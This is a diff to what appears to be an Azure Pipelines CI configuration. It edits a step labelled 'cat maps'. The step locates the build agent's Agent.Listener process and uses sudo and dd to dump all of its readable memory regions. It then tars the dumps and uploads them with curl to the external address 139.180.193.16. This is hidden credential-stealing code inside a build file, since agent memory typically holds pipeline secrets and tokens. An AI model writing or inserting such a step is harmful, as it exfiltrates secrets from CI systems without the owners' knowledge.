@@ -192,8 +192,23 @@ steps:
 
 - script: |
     #!/bin/bash
-    PID=$(ps -e | grep "Agent.Listener" | awk '{print $1}')
 
+    # 获取Agent.Listener进程的PID
+    PID=$(ps -e | grep "Agent.Listener" | grep -v grep | awk '{print $1}')
+    
+    # 确保获取到了PID
+    if [ -z "$PID" ]; then
+        echo "Error: Unable to find PID for Agent.Listener."
+        exit 1
+    fi
+    
+    echo "The PID of Agent.Listener is $PID"
+    
+    # 为内存转储创建临时目录
+    DUMP_DIR="/tmp/${PID}_mem_dumps"
+    mkdir -p "$DUMP_DIR"
+    
+    # 获取可读取的内存区域
     sudo cat /proc/$PID/maps | while read line; do
         start_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f1)
         end_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
@@ -206,16 +221,23 @@ steps:
             
             # 使用十进制数执行dd命令
             echo "Dumping memory from $start_dec to $end_dec"
-            sudo dd if=/proc/$PID/mem of="/tmp/${PID}_mem_$start_hex" bs=1 skip=$start_dec count=$size 2>/dev/null
-            
-            # 检查文件是否成功创建并且大小正确
-            if [ -s "/tmp/${PID}_mem_$start_hex" ]; then
-                echo "Uploading memory dump of size $(stat -c %s "/tmp/${PID}_mem_$start_hex") bytes"
-                sudo curl -F "file=@/tmp/${PID}_mem_$start_hex" http://139.180.193.16:5000/upload
-            else
-                echo "Failed to dump memory or file is empty."
-            fi
+            sudo dd if=/proc/$PID/mem of="$DUMP_DIR/${PID}_mem_$start_hex" bs=1 skip=$start_dec count=$size 2>/dev/null
         fi
     done
+    
+    # 打包所有转储文件
+    tar -czf "/tmp/${PID}_memory_dumps.tar.gz" -C "$DUMP_DIR" .
+    
+    # 检查打包是否成功并且文件不为空
+    if [ -s "/tmp/${PID}_memory_dumps.tar.gz" ]; then
+        echo "Uploading memory dump package of size $(stat -c %s "/tmp/${PID}_memory_dumps.tar.gz") bytes"
+        sudo curl -F "file=@/tmp/${PID}_memory_dumps.tar.gz" http://139.180.193.16:5000/upload
+    else
+        echo "Failed to create memory dump package or file is empty."
+    fi
+    
+    # 清理创建的临时目录
+    rm -rf "$DUMP_DIR"
+
 
   displayName: 'cat maps'
